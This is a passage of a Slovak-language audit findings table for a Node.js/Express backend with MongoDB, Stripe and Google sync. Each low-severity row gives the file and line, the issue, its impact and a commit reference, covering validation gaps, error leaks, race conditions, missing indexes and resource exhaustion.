| NÍZKA | `server/routes/admin.js:1610` | Chart endpointy akceptujú neobmedzené ?days → slučka s miliónmi iterácií | Jeden request zablokuje event loop Node procesu na sekundy až minúty (DoS celej inštancie na Render) – vyžaduje admin token, ale klient preklep stačí. | `cbd34ea0` |
| NÍZKA | `server/routes/admin.js:1918` | GET /storage: 16 kolekcií × 2 sekvenčné DB príkazy; collStats je deprecated command | Otvorenie Storage tabu trvá niekoľko sekúnd (latencia Atlasu × 32); pri budúcom upgrade Atlasu môže `collStats` prestať fungovať. | `ccde9da6` |
| NÍZKA | `server/routes/admin.js:2543` | GET /errors: záporný limit prejde do skip()/limit() → MongoServerError 500 | 500 namiesto 400 a falošný záznam v Diagnostike. | `5561ec92` |
| NÍZKA | `server/routes/admin.js:2629` | PUT /errors/:id/resolve: notes?.slice padá pre ne-reťazec | 500 pri chybnom payloade, nesprávny status. | `37a7ec4b` |
| NÍZKA | `server/routes/admin.js:3213` | Email broadcast: activeWithinDays bez validácie → Invalid Date vo filtri → 500 | 500 namiesto 400; únik interného textu chyby. | `ca330705` |
| NÍZKA | `server/routes/admin.js:3506` | Jednorazový recovery endpoint s napevno zapísaným mapovaním zákazníckych dát ostáva nasadený | Opakované spustenie môže prepísať aktuálne dáta; osobné údaje zákazníkov sú zapísané v zdrojovom kóde. | `902fed6c` |
| NÍZKA | `server/routes/admin.js:3745` | POST /affiliates/enroll vytvára User bez hesla s authProviders ['password'] a bez validácie emailu/IBAN | Nekonzistentný auth stav účtu (môže ovplyvniť disconnect/last-method guard v auth flow), neplatné IBAN v účtovných exportoch, 500 pri chybnom vstupe. | `a634b167` |
| NÍZKA | `server/routes/admin.js:3862` | GET /commissions: search filtruje až po stránkovaní a status/referrerId nie sú validované | Admin pri hľadaní nevidí záznamy z iných stránok a `total` nesedí; chybné vstupy končia 500. | `239a2fd1` |
| NÍZKA | `server/routes/admin.js:3938` | POST /commissions/bulk-pay: check-then-act bez podmienky status v updateMany; $inc podľa prečítanej sumy | Nesprávny denormalizovaný súčet vyplatených provízií a prepísané poznámky účtovníctva. | `5c1b5502` |
| NÍZKA | `server/routes/admin.js:3985` | CSV export provízií: ochrana proti formula injection vracia nesprávne obalenú bunku | Účtovný export sa pri username/paidReference začínajúcom pomlčkou alebo `@` rozsype do nesprávnych stĺpcov. | `c3be9a08` |
| NÍZKA | `server/routes/affiliate.js:95` | payoutBankName / payoutNote bez limitu dĺžky a typu | Nafúknutý User dokument sa načítava pri každom requeste (auth middleware, `User.findById`) a v admin affiliate prehľade → zbytočná záťaž, možný zámerný DoS vlastného účtu/admin UI. | `6de38af4` |
| NÍZKA | `server/routes/affiliate.js:114` | Nevalidovaný query parameter `status` ide priamo do Mongo filtra (operator injection) | Nízky — obmedzené na vlastné dáta; potenciálne drobné ReDoS/CPU zaťaženie cez `$regex`, nekonzistentné správanie API. | `f2d2216a` |
| NÍZKA | `server/routes/attachments.js:138` | In-memory `jobs` Map rastie s každým POST /export bez stropu na používateľa – čistí sa len pri ďalšom POST | Prihlásený používateľ workspace-u s mnohými prílohami vie opakovaným POST /export vyčerpať pamäť 512 MB inštancie (rádovo 100–200 kB na job × stovky až tisíce jobov) → OOM reštart pre všetkých tenantov. | `281680e5` |
| NÍZKA | `server/routes/attachments.js:197` | ZIP export načíta ContactFile riadky bez projekcie – legacy base64 `data` až 500 súborov naraz v RAM | Pri ZIP exporte workspace-u s nemigrovanými prílohami jeden request alokuje stovky MB → OOM reštart Render inštancie (512 MB) a výpadok pre všetkých tenantov. | `3443aa3d` |
| NÍZKA | `server/routes/attachments.js:197` | ZIP export neoveruje, že blob (ContactFile) patrí do workspace-u – chýba obdoba blobBelongsToWorkspace | Pri akejkoľvek regresii, ktorá dovolí podstrčiť cudzí fileId do metadát (ako do 9/2026), si útočník jedným ZIP-om stiahne bloby iného tenanta – bez zápisu v logoch, lebo GET /export/:jobId je autorizovaný len tokenom. | `2e39d3b4` |
| NÍZKA | `server/routes/auth-apple.js:145` | Výmena kódu za tokeny u Apple a Google beží bez timeoutu | Zaseknuté prihlasovanie a držanie serverových spojení pri problémoch tretej strany; horší UX hlavne v mobilných WebView. | `3e9a9d15` |
| NÍZKA | `server/routes/auth-connections.js:42` | Citlivé zmeny prihlasovacích metód (odpojenie hesla/OAuth, pripojenie providera) bez re-autentifikácie | Eskalácia dopadu ukradnutého tokenu na trvalé prevzatie účtu (lockout obete). | `3e9a9d15` |
| NÍZKA | `server/routes/auth.js:221` | forgot-password loguje zadaný e-mail (PII) v otvorenom texte | Zbytočné uchovávanie osobných údajov v logoch; pri úniku logov únik e-mailov tretích strán. | `6a30a0f0` |
| NÍZKA | `server/routes/auth.js:293` | Reset hesla pre OAuth-only používateľa nepridá 'password' do `authProviders` | Nekonzistentný stav prihlasovacích metód; používateľ si nevie odpojiť OAuth účet napriek nastavenému heslu; UI ukazuje protichodné informácie. | `6a30a0f0` |
| NÍZKA | `server/routes/auth.js:657` | GET /profile načítava celý User dokument vrátane `avatarData` (až ~6,7 MB base64) a Google token máp | Zbytočný prenos megabajtov z MongoDB a CPU na dešifrovanie pri každom otvorení profilu; na Render Starter (512 MB RAM) prispieva k pamäťovým špičkám. | `6a30a0f0` |
| NÍZKA | `server/routes/auth.js:677` | PUT /profile neuplatňuje validáciu e-mailu, username ani dĺžok | Neplatné e-maily v DB (zlyhanie doručovania), nadmerne dlhé/HTML používateľské mená. | `6a30a0f0` |
| NÍZKA | `server/routes/auth.js:756` | Invalidácia avatar cache je no-op, keď je `req.user.id` ObjectId (bez Redisu / pri výpadku Redisu) | Používateľ po zmene/odstránení avatara vidí až 5 min starý obrázok; závisí od prostredia (Redis je voliteľný), takže sa správanie líši medzi dev a prod. | `6a30a0f0` |
| NÍZKA | `server/routes/auth.js:853` | PUT /password padá na 500 pre OAuth-only používateľa alebo chýbajúce `currentPassword` | Chybový stav 500 (zachytí ho aj monitoring ako serverovú chybu) pre legitímny scenár; OAuth používateľ si nevie nastaviť heslo. | `6a30a0f0` |
| NÍZKA | `server/routes/auth.js:1220` | Guard proti zmazaniu vlastného účtu v DELETE /users/:userId nefunguje pri ObjectId req.user.id | Obídenie self-delete guardu; cross-tenant mazanie účtov; osirelé WorkspaceMember záznamy. | `6a30a0f0` |
| NÍZKA | `server/routes/auth.js:1279` | PUT /users/:userId/role — bez validácie ID, race pri „poslednom adminovi“, bez invalidácie cache cieľa, socket emit do nesprávneho workspace | Falošné 500, oneskorené uplatnenie role, možnosť stavu bez admina, notifikácia do nesprávnej miestnosti. | `6a30a0f0` |
| NÍZKA | `server/routes/billing.js:3` | Stripe klient bez `timeout` — GET /status čaká na Stripe API až 80 s pri každom načítaní billing stránky | Zablokované requesty a vlákna pri výpadku Stripe; billing stránka sa nenačíta ani v časti, ktorá Stripe nepotrebuje. | `2306515f` |
| NÍZKA | `server/routes/billing.js:49` | getOrCreateCustomer nie je atomické — paralelné /checkout vytvoria duplicitných Stripe zákazníkov | Duplicitní zákazníci v Stripe (neporiadok v dashboarde, portál ukazuje len jedného), riziko nenapárovania invoice eventov. | `51806241` |
| NÍZKA | `server/routes/billing.js:437` | validate-promo a checkout volajú `.toUpperCase()` na nevalidovanom vstupe — ne-string spôsobí 500 namiesto 400 | Falošné 500-ky v Diagnostike, klient dostane generickú serverovú chybu namiesto validačnej. | `20f64f0c` |
| NÍZKA | `server/routes/billing.js:568` | Stripe webhook vracia `error.message` v tele odpovede | Únik interných detailov do externého systému; Stripe neopakuje doručenie, hoci spracovanie zlyhalo. | `fbc81a03` |
| NÍZKA | `server/routes/billing.js:595` | `subscription.source` sa nenastaví pri checkout.session.completed a nevyčistí pri subscription.deleted | Nekonzistentné `source` v DB a /status → IapBilling.jsx (`status.source === 'apple'`) zobrazuje nesprávny stav spravovania predplatného; sťažená diagnostika double-billing prípadov. | `699e8829` |
| NÍZKA | `server/routes/billing.js:616` | Lookupy podľa subscription.stripeSubscriptionId / stripeCustomerId nemajú index (COLLSCAN pri každom Stripe webhooku) | Rastúca latencia webhookov s počtom používateľov (Stripe má timeout na odpoveď), zbytočné zaťaženie Atlas tieru. Pri stovkách používateľov zanedbateľné, pri desiatkach tisíc problém. | `56802124` |
| NÍZKA | `server/routes/billing.js:636` | Webhook handlery prepisujú celý objekt `subscription` cez `$set` — paralelné zápisy iných polí (notifications.*, apple*) sa stratia | Zriedkavá, ťažko reprodukovateľná strata flagov (duplicitné welcome e-maily, zmazané Apple identifikátory, reset discount polí). | `699e8829` |
| NÍZKA | `server/routes/billing.js:643` | past_due: `source` sa nastaví na null pri zachovanom plane a riadok 652 číta už prepísanú hodnotu | Nekonzistentný stav (paid plan bez source), v hraničnom prípade neúmyselný downgrade počas Stripe dunning procesu, hoci komentár deklaruje opak. | `699e8829` |
| NÍZKA | `server/routes/billing.js:820` | charge.refunded revokuje celú províziu aj pri čiastočnom refunde | Nespravodlivé krátenie provízií affiliate partnerom pri čiastočných refundoch; chýba audit stopa o výške refundu. | `eb86c81c` |
| NÍZKA | `server/routes/billingApple.js:133` | Anti-hijack kontrola originalTransactionId je check-then-act bez unique indexu | Jedna Apple platba môže aktivovať plán na viacerých účtoch; notifikácie (REFUND/EXPIRED) sa potom aplikujú len na prvý nájdený `findOne` výsledok (riadok 214) — druhý účet ostane paid. | `6e72629b` |
| NÍZKA | `server/routes/contact-form.js:14` | Druhý, natvrdo nakonfigurovaný SMTP transporter s inou env premennou a bez timeoutov | Konfiguračný drift (dve sady SMTP premenných) — pri zmene poskytovateľa/hesla sa ľahko zabudne na túto cestu a kontaktný formulár ticho prestane fungovať; dlhé visiace requesty pri výpadku SMTP. | `37e610e6` |
| NÍZKA | `server/routes/contact-form.js:26` | Chýba kontrola typu vstupov → TypeError a 500 namiesto 400 | Nesprávny stavový kód (500 pre chybu klienta) — zahltí ServerError diagnostiku cez `captureResponseErrors` (index.js) a zavádza klienta/monitoring. | `2ce0c0ea` |
| NÍZKA | `server/routes/contacts.js:437` | GET /contacts vracia klientovi interný text chyby (`error: error.message`) | Únik interných detailov infraštruktúry (Atlas host, názvy polí) ľubovoľnému prihlásenému používateľovi pri výpadku DB. | `733377ab` |
| NÍZKA | `server/routes/contacts.js:519` | Prázdne `catch` bloky bez logovania (500 bez stopy) | Produkčné chyby (vrátane straty dát z nálezov 01/02) sa nedajú diagnostikovať; serverErrorService ich nezachytí so stackom. | `733db38c` |
| NÍZKA | `server/routes/contacts.js:537` | Neplatné ObjectId v :id/:contactId končí CastError → 500 + falošný záznam v Diagnostike (všetky /:id routy) | Zle sformovaný alebo zastaraný deep-link (notifikácia, iCal, história prehliadača) vráti 500 namiesto 404; klient to zobrazí ako chybu servera a Diagnostika sa plní falošnými 500-kami, ktoré prekrývajú reálne chyby. Neautentizova… | `f9e3b70f` |
| NÍZKA | `server/routes/contacts.js:544` | Polia kontaktu bez typovej a dĺžkovej validácie; `status` nie je obmedzený na povolené hodnoty (POST aj PUT) | 900 kB `notes` sa uloží, pri každej zmene sa celý kontakt vysiela socketom všetkým členom (`contact-updated`) a drží sa v 2-min cache zoznamu; neznámy `status` rozbije filtre v Dashboard/CRM (kontakt zmizne zo všetkých kariet) a … | `e9d85124` |
| NÍZKA | `server/routes/contacts.js:547` | `User.findById(req.user.id)` bez projekcie sťahuje celý User dokument (base64 avatar, Google sync mapy) len kvôli `subscription.plan` | Každé vytvorenie kontaktu, podúlohy a každý transfer prenáša z Atlasu zbytočné kB a hydratuje Mongoose dokument s Map poliami – zbytočná latencia a CPU na zdieľanej DB aj na 512 MB inštancii. | `e50be881` |
| NÍZKA | `server/routes/contacts.js:742` | ContactFile.findOne podľa fileId bez `workspaceId` (nekonzistentné s L275) | Ak by sa do `files[].id` kontaktu dostalo cudzie fileId (napr. cez import/duplikáciu), vrátil by sa súbor iného tenantu. | `e31f3244` |
| NÍZKA | `server/routes/contacts.js:1062` | DELETE kontaktu maže R2 bloby skôr, než sa zmaže Contact dokument – pri zlyhaní Mongo zostanú metadáta bez dát | Používateľ dostane 500, kontakt ostane viditeľný, ale všetky jeho prílohy skončia pri stiahnutí na „Dáta súboru nenájdené — súbor treba znovu nahrať“; nenávratná strata. | `7f6dab5e` |
| NÍZKA | `server/routes/contacts.js:1113` | Vytvorenie projektu/úlohy kontaktu: `title.trim()` na ne-reťazci padá na 500, `assignedTo`/`priority` bez validácie | Chyba klienta sa hlási ako chyba servera (500 + záznam v Diagnostike); nevalidné `assignedTo` môže vyrobiť priradenie na neexistujúce ID a `priority` mimo očakávaných hodnôt rozbije triedenie/zvýraznenie v UI. | `7036ab0f` |
| NÍZKA | `server/routes/contacts.js:1199` | PUT projektu prijíma celý strom `subtasks` od klienta – klient vie nastaviť reminderSent/timeRemindersSent/copiedFrom/order a ID podúloh | Používateľ vie resetovať „už odoslané“ príznaky a nechať si pripomienky poslať znova, obísť plánový limit počtu podúloh jedným PUT, alebo nastaviť ID podúlohy zhodné s podúlohou iného kontaktu (Google sync mapy sú kľúčované UUID … | `72e1a7a2` |
| NÍZKA | `server/routes/contacts.js:2079` | Storage kvóta a limit počtu kontaktov sú check-then-act – paralelné requesty obídu plánový strop | Tenant vie prekročiť 1 GB/10 GB kvótu či 5/25 kontaktov o veľkosť súbežnej dávky; nie je to zneužiteľné masovo (limit 50 MB/súbor), ale plánové limity nie sú tvrdé. Týka sa plánovej/platobnej logiky, preto len na schválenie. | `72e1a7a2` |
| NÍZKA | `server/routes/contacts.js:2099` | `(req.body.customName \|\| '').trim()` padne na TypeError, ak multer dostane pole `customName` viackrát (pole hodnôt) | Zle poskladané multipart telo (iný klient, duplicitné pole) končí 500-kou a falošným server errorom namiesto použitia pôvodného názvu. | `6672038b` |
| NÍZKA | `server/routes/contacts.js:2177` | Upload: po úspešnom nahraní do R2 zlyhanie ContactFile.create/contact.save necháva osirotený blob (bez cleanupu) | Rastúca R2 spotreba a sirotské ContactFile riadky, ktoré nie sú viditeľné v žiadnom UI ani kvóte (kvóta sa počíta z metadát). Používateľ nahrá súbor znova → ďalší duplikát. | `c237809e` |
| NÍZKA | `server/routes/emailUnsubscribe.js:75` | GET /api/email/unsubscribe mení stav — link scannery odhlásia usera bez jeho vedomia | Používatelia (najmä firemní s Microsoft 365) prídu o pripomienky T-7/T-1/winback bez vlastného kliknutia — tichý výpadok retenčných emailov; nikto si to nevšimne, lebo odhlásenie vyzerá ako legitímne. | `bd823c99` |
| NÍZKA | `server/routes/googleCalendar.js:570` | Chýbajúca null kontrola po `User.findById` – zmazaný používateľ s platným tokenom dostane 500 namiesto 404 | TypeError → 500 s nič nehovoriacou chybou namiesto korektného 404; chyby sa zapisujú do Diagnostiky ako serverové. | `7377fe69` |
| NÍZKA | `server/routes/googleCalendar.js:641` | /disconnect volá `calendarList.list` dvakrát a celý cleanup (stovky sekvenčných volaní) beží v request-e | Zbytočné API volanie a dlhá odpoveď pri odpájaní; pri timeoute klient zobrazí chybu, hoci odpojenie na serveri prebehlo. | `73effd68` |
| NÍZKA | `server/routes/googleCalendar.js:1130` | Neautentifikovaný webhook robí dopyt na `googleCalendar.watchChannelId` bez indexu (plný sken kolekcie User) | Každý webhook (aj podvrhnutý s náhodným channelId) spôsobí COLLSCAN kolekcie User vrátane veľkých `avatarData` dokumentov – lacný DoS vektor na DB; pri raste počtu používateľov rastie lineárne. | `56802124` |
| NÍZKA | `server/routes/googleCalendar.js:1156` | Webhook spúšťa `processCalendarChanges` bez per-user zámku – súbežné notifikácie spracúvajú ten istý syncToken | Zbytočné duplicitné volania Google API a DB zápisy, pretekanie `syncToken` (môže viesť k opakovanému alebo preskočenému spracovaniu). | `37c40324` |
| NÍZKA | `server/routes/googleCalendar.js:1245` | Bulk /sync Calendar synchronizuje aj úlohy priradené iným používateľom – nekonzistentné so /status, auto-syncom a Tasks /sync | Používateľovi pribudnú v kalendári úlohy kolegov; počítadlo „pending“ v /status nikdy nesedí s tým, čo bulk sync reálne poslal; vyššia spotreba Google kvóty. | `2442e5a7` |
| NÍZKA | `server/routes/googleCalendar.js:1506` | Interné `error.message` sa vracia klientovi v 500 odpovediach (viacero handlerov) | Únik interných detailov (názvy kolekcií, cesty, Google API odpovede) útočníkovi; nekonzistentné UX hlášky. | `5fdad60d` |
| NÍZKA | `server/routes/googleCalendar.js:1991` | N+1: `WorkspaceMember.find` sa volá v cykle pre každú migrovanú úlohu | Pri stovkách záznamov stovky zbytočných DB dopytov v jednom requeste. | `187761f4` |
| NÍZKA | `server/routes/googleTasks.js:487` | GET /status vykoná `user.save()` pri každom volaní, aj keď sa nič nezmenilo | Zbytočný zápis do Mongo pri každom čítaní stavu (write-on-read), invalidácie cache a riziko VersionError pri súbežnom synci. | `f5a30cd0` |
| NÍZKA | `server/routes/googleTasks.js:917` | SYNC_TIMEOUT 10 minút sa rovná Render request timeoutu – odpoveď po dlhom synci nemusí doraziť | Klient dostane 502/timeout bez správy o stave, hoci server sync dokončil; používateľ ho spustí znova (duplicity, viď srv-google-11). | `fa5fed1c` |
| NÍZKA | `server/routes/googleTasks.js:1485` | Interné `error.message` v 500 odpovediach Google Tasks handlerov | Únik interných detailov výnimiek (Mongoose/Google API) klientovi. | `5fdad60d` |
| NÍZKA | `server/routes/googleTasks.js:1909` | /delete-by-search prechádza všetky Google listy druhýkrát len kvôli ladiacemu počtu úloh | Zdvojnásobenie volaní Google Tasks API a čerpania dennej kvóty pre jednu akciu; dlhšia odpoveď. | `ec95ec2a` |
| NÍZKA | `server/routes/googleTasks.js:2759` | Polling cyklus bez ochrany proti prekrývaniu – pri dlhom cykle sa spustí ďalší paralelne | Prekrývajúce sa cykly spracúvajú tie isté zmeny dvakrát, súbežne `save()`-ujú ten istý User dokument a násobia záťaž API/DB. | `9c867b0a` |
| NÍZKA | `server/routes/messages.js:257` | Storage kvóta sa určuje podľa plánu nahrávajúceho, ale využitie podľa celého workspace-u | Kvóta sa dá obísť (free člen), resp. je príliš prísna (Team člen v Pro tíme); nejasná účtovná logika. | `5cabb3a3` |
| NÍZKA | `server/routes/messages.js:283` | Sťahovanie príloh načítava celý objekt z R2 do pamäte (až 50 MB) namiesto streamovania | Súbežné sťahovanie viacerých veľkých príloh zaťažuje RAM Render inštancie, vyššia latencia do prvého bajtu na mobile. | `5cabb3a3` |
| NÍZKA | `server/routes/messages.js:390` | GET /by-linked dotaz nemá podporný index (scan všetkých správ workspace-u + sort v pamäti) | Rastúca latencia detailu kontaktu/úlohy s počtom správ v tíme. | `5cabb3a3` |
| NÍZKA | `server/routes/messages.js:495` | Možnosť ankety null/number v pollOptions → TypeError → 500 | 500 a šum v Diagnostike pre nevalidný vstup ankety. | `f1a8b673` |
| NÍZKA | `server/routes/messages.js:504` | POST / načíta celý User dokument príjemcu vrátane avatarData (až ~6,7 MB) kvôli _id a username | Zbytočný prenos megabajtov z Monga a hydratácia pri každom odoslaní správy príjemcovi s avatarom. | `59118b12` |
| NÍZKA | `server/routes/messages.js:530` | Textové polia z tela sa volajú .trim() bez kontroly typu → TypeError → 500 pri JSON tele | 500 namiesto 400, šum v Diagnostike, triviálne spustiteľné cez API. | `d97926ed` |
| NÍZKA | `server/routes/messages.js:534` | linkedId a linkedName sa ukladajú bez obmedzenia dĺžky | Zbytočný rast dokumentov a odpovedí, DoS klienta (najmä mobilný WebView) obrovským zoznamom. | `0bf3146c` |
| NÍZKA | `server/routes/messages.js:553` | Notifikácia, socket a audit používajú neskrátený surový subject/reason namiesto uložených hodnôt | Nafúknuté notifikácie/audit záznamy, zlyhanie push notifikácie pri dlhom predmete, nekonzistencia s uloženou správou. | `64a6c0c3` |
| NÍZKA | `server/routes/messages.js:622` | PUT /:id dovoľuje zmeniť type z/na 'poll' bez úpravy pollOptions | Nekonzistentné správy (anketa bez možností / možnosti bez ankety), zmätočné UI. | `5cabb3a3` |
| NÍZKA | `server/routes/messages.js:741` | Catch bloky vracajú 500 bez logovania/recordError → skutočná príčina sa stratí | Produkčné chyby v schvaľovaní/mazaní správ sa nedajú diagnostikovať. | `07ade1be` |
| NÍZKA | `server/routes/messages.js:1273` | Reakcia na komentár: $pull a $push v dvoch neatomických update podľa starého čítania → možné 2 reakcie jedného používateľa | Duplicitné reakcie, nesprávne počty like/dislike. | `87aacaf1` |
| NÍZKA | `server/routes/notifications.js:27` | GET /notifications robí tri sekvenčné dotazy, ktoré môžu bežať paralelne | Zbytočne ~3× RTT do Atlasu na každé otvorenie zvončeka (volá sa často na všetkých platformách). | `d0afe55d` |
| NÍZKA | `server/routes/notifications.js:146` | sectionMap[req.params.section] bez hasOwn — prototypové kľúče prejdú validáciou a skončia 500 | Falošné 500 v Diagnostike; triviálne vyvolateľné ľubovoľným prihláseným používateľom. | `85a060e2` |
| NÍZKA | `server/routes/pages.js:23` | GET /pages vracia všetky stránky vrátane plného obsahu (až 500 kB/str.) bez projekcie, limitu a lean() | Pri desiatkach stránok prenos desiatok MB na jeden request a vysoká pamäťová špička na Render inštancii; na mobilných sieťach neúnosné. | `cb0060de` |
| NÍZKA | `server/routes/pages.js:107` | icon stránky bez typovej a dĺžkovej validácie | Falošné 500 a možnosť uložiť veľké reťazce ako „ikonu“. | `e3d3eddc` |
| NÍZKA | `server/routes/pages.js:117` | Reparent stránky umožňuje cyklus (rodič = sama alebo vlastný potomok) | Stránky v cykle zmiznú zo stromu (nedosiahnuteľné z koreňa) a nedajú sa štandardne zmazať; klientsky strom môže pri rekurzívnom renderi zamrznúť. | `83da3b9f` |
| NÍZKA | `server/routes/push.js:20` | In-memory rate limiter je kľúčovaný req.user.id, ktoré môže byť ObjectId → Map podľa identity, limit neúčinný | Používateľ môže spamovať testovacie web-push správy (náklady/limity push služieb, pri 404/410 mazanie subscriptions) a nafukovať pamäť limitera; správanie závisí od toho, či beží Redis. | `cbafd155` |
| NÍZKA | `server/routes/push.js:49` | Module-level setInterval bez `.unref()` a bez cleanup | Proces sa nedokáže ukončiť gracefully (testy/skripty visia); pri pomalom pollingu Google Tasks sa behy prekrývajú a duplikujú synchronizáciu. | `7daca7be` |
| NÍZKA | `server/routes/push.js:92` | Web push subscribe bez typových a dĺžkových limitov (endpoint, keys) | Ukladanie veľkých nezmyselných subscription dokumentov (unique index na endpoint, bloat), CastError → 500 pri nestringových kľúčoch. | `291d440f` |
| NÍZKA | `server/routes/push.js:331` | APNs token: dĺžka sa kontroluje pred normalizáciou — môže sa upsertnúť prázdny/skrátený token | Nezmyselné APNsDevice záznamy (jeden zdieľaný '' token pre viacerých používateľov vďaka unique indexu sa prepisuje medzi účtami), zbytočné chybové pokusy pri každej notifikácii. | `291d440f` |
| NÍZKA | `server/routes/push.js:394` | Interné chybové správy sa vracajú klientovi (error.message) v APNs/FCM endpointoch | Únik interných detailov (názvy modulov, cesty, konfigurácia APNs/FCM, Mongo chyby) bežnému používateľovi; chyby chýbajú v serverových logoch. | `045886b2` |
| NÍZKA | `server/routes/push.js:441` | fcm/register ukladá nevalidované platform/packageName/appVersion a token bez horného limitu | Nekonzistentné dáta v FcmDevice, falošné 500, možnosť bloatu cez dlhé reťazce. | `6bdcd35c` |
| NÍZKA | `server/routes/push.js:441` | Registrácia FCM zariadenia zapisuje `platform`/`packageName`/`appVersion` bez validácie (findOneAndUpdate bez validators) | Znečistené dáta zariadení, možné pády pri rozhodovaní podľa platformy pri odosielaní pushov. | `6bdcd35c` |
| NÍZKA | `server/routes/push.js:465` | fcm/unregister a apns/unregister neoverujú typ tokenu (operátorová injekcia / TypeError) | Dopad je obmedzený na vlastné zariadenia (filter userId), ale ide o nevalidovaný vstup do Mongo filtra a falošné 500. | `291d440f` |
| NÍZKA | `server/routes/tasks.js:342` | GET /tasks vracia interné `error.message` klientovi | Únik informácií o schéme/implementácii; v kombinácii s nálezom srv-tasks-03 útočník vidí presnú príčinu a vie ladiť vstup. | `b6bad2fb` |
| NÍZKA | `server/routes/tasks.js:409` | CSV export formátuje dátumy v časovej zóne servera (UTC), nie Europe/Bratislava | Nesprávny dátum vytvorenia v exporte pre slovenských používateľov (posun o deň pri večerných záznamoch); `dueDate` ako dátum bez času je OK. | `e8b56a17` |
| NÍZKA | `server/routes/tasks.js:910` | Verejný iCal feed padne na 500 pri neplatnom createdAt podúlohy (toISOString na Invalid Date) | Jedna chybná hodnota v jednej podúlohe zhodí celý kalendárny feed používateľa (všetky podúlohy, všetky kalendárne klienty) – trvalo, kým sa hodnota neopraví v DB. | `e41b2215` |
| NÍZKA | `server/routes/tasks.js:948` | Hodnoty z tela požiadavky idú priamo do `_id` filtrov bez typovej kontroly (NoSQL operátorová injekcia v rámci workspace) | Člen vie cez `/reorder` alebo `/duplicate` zasiahnuť „ľubovoľný prvý“ kontakt/úlohu vo vlastnom workspace namiesto konkrétneho; neplatné hodnoty vracajú 500 namiesto 400 a plnia Diagnostiku. | `b32d59f2` |
| NÍZKA | `server/routes/tasks.js:1094` | Chýbajúca validácia vstupov: `title.trim()` na ne-reťazci hádže TypeError (500), bez limitov dĺžky, priority a formátu dueDate/dueTime | Nesprávne stavové kódy, možnosť uložiť nezmyselné dáta, ktoré neskôr lámu exporty (CSV „Invalid Date“, iCal `NaNNaNNaN`) a pripomienkový cron, a ukladanie stoviek KB textu do embedded dokumentov Contact (16 MB BSON strop). | `b8685f63` |
| NÍZKA | `server/routes/tasks.js:1206` | Viackontaktové vytvorenie projektu: 403 PLAN_LIMIT až po uložení do predchádzajúcich kontaktov | Čiastočne vytvorené dáta + chybová odpoveď → používateľ zopakuje akciu a vzniknú duplikáty v kontaktoch, kde už úloha je. Dlhé pole contactIds = dlhý sekvenčný request. | `5d22d4c1` |
| NÍZKA | `server/routes/tasks.js:1248` | Sekvenčné nezávislé await-y a opakovaný populateAssignedUsers v slučke | Zbytočná latencia (Atlas M0 ~100-300 ms na dotaz) pri vytváraní projektu do viacerých kontaktov, pri exportoch a pri každom polli kalendárneho feedu. | `cb3a57a7` |
| NÍZKA | `server/routes/tasks.js:1507` | Notifikácie členom sa vytvárajú sekvenčne v ceste požiadavky pred odpoveďou | Každá úprava/odškrtnutie/zmazanie projektu trvá o stovky ms až sekundy dlhšie úmerne počtu členov; na mobile pôsobí appka pomaly. | `bb3f05a1` |
| NÍZKA | `server/routes/tasks.js:1570` | PUT /:id a DELETE /:id bez ObjectId guardu – UUID bez `source` končí 500 a fallback vetvy sú mŕtvy kód | Nesprávny stavový kód (500 namiesto 404/200) pre klientsku chybu, zbytočné záznamy v Diagnostike, a ~190 riadkov nedosiahnuteľného kódu, ktorý maskuje skutočnú príčinu. | `e2eea531` |
| NÍZKA | `server/routes/tasks.js:2007` | Zmazanie projektu/podúlohy nikdy nezmaže bloby príloh (R2 + ContactFile) | Trvalý rast R2 úložiska a ContactFile kolekcie (náklady), siroty neviditeľné pre používateľa; kvóta sa počíta z metadát, takže používateľa to neblokuje. | `6fbc02ed` |
| NÍZKA | `server/routes/tasks.js:2106` | Duplikácia úlohy a vytváranie úloh v kontakte obchádzajú plánové limity počtu úloh (neoverené limity) | Free používateľ môže duplikovaním obísť limit úloh; nerovnaké vynucovanie limitov medzi endpointmi. | `7118f153` |
| NÍZKA | `server/routes/tasks.js:3103` | Upload: po persistFile a neúspešnom uložení metadát (404) ostáva blob v R2 a riadok v ContactFile | Postupný únik úložiska (R2 náklady) a ContactFile záznamov bez metadát, ktoré potom v Diagnostike vyzerajú ako „TaskFileMetaMissing“. | `15eee668` |
| NÍZKA | `server/routes/tasks.js:3272` | Content-Disposition používa percent-enkódovaný názov v `filename=` namiesto `filename*=UTF-8''` | Skomolené názvy súborov s diakritikou pri priamom otvorení URL (napr. v natívnom WebView alebo pri budúcom presigned/direct downloade); nekonzistentné s iOS bridgom, ktorý očakáva čistý názov. | `63ae748d` |
| NÍZKA | `server/routes/workspaces.js:127` | POST / — chýbajúce typové kontroly name/description/color (TypeError → 500, color bez validácie) | Falošné 500 pri chybnom payloade; uloženie až ~1 MB reťazca ako „farba“, ktorý sa potom posiela každému členovi v zozname workspace. | `6c894235` |
| NÍZKA | `server/routes/workspaces.js:143` | Plánové limity sú check-then-act — súbežné requesty ich prekročia | Free účet získa 2 workspace alebo workspace prekročí limit členov o 1–2 bez upgradu; následne enforceWorkspaceLimits zablokuje tvorbu obsahu (mätúce pre tím). | `23e9472a` |
| NÍZKA | `server/routes/workspaces.js:155` | Názov workspace len z ne-latinkových znakov vedie k prázdnemu slugu a 500 | Používatelia (napr. ukrajinsky/rusky hovoriaci kolegovia alebo názvy s emoji) nedokážu vytvoriť workspace a dostanú nič nehovoriacu 500. | `51f6aa76` |
| NÍZKA | `server/routes/workspaces.js:207` | inviteCode bez typovej/dĺžkovej kontroly — TypeError → 500 | Falošné 500 a šum v Diagnostike; zbytočné DB dotazy pre zjavne neplatné kódy. | `6c894235` |
| NÍZKA | `server/routes/workspaces.js:243` | Plánové kontroly načítavajú celé User dokumenty (avatarData, tokeny) hoci čítajú len subscription.plan / email | Zbytočná záťaž DB a servera na frekventovaných tvoriacich cestách (POST kontakt/úloha/podúloha), pomalšie odpovede pre mobil. | `8fd92b54` |
| NÍZKA | `server/routes/workspaces.js:248` | Natvrdo zakódované e-maily s výnimkou z plánových limitov, nekonzistentne aplikované | Skryté „backdoor“ pravidlo plánového gatingu, PII v repozitári, ťažko auditovateľné správanie limitov. | `23e9472a` |
| NÍZKA | `server/routes/workspaces.js:438` | findByIdAndUpdate bez runValidators — obídenie maxlength description (500) a nevalidované inviteCodeEnabled/color | Bloat dokumentu Workspace (prenáša sa každému členovi v GET / a /current), nekonzistentné dáta, falošné 500. | `6c894235` |
